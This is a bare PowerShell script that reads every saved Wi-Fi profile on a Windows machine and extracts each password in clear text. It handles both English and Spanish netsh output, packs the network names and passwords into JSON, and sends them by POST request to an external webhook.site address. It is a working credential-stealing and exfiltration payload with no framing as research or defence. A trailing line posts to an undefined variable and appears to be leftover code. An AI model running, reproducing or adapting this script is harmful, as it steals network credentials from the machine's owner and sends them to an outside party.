$profiles = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
$wifiData = foreach ($name in $profiles) {
    $result = netsh wlan show profile name="$name" key=clear
    $pass = $result | Select-String "(Key Content|Contenido de la clave)\s+\:(.+)$" | ForEach-Object { $_.Matches.Groups[2].Value.Trim() }
    if ($pass) { [PSCustomObject]@{ SSID = $name; Password = $pass } }
}
if ($wifiData) {
    $payload = $wifiData | ConvertTo-Json
    Invoke-WebRequest -Uri "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing
}
Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing
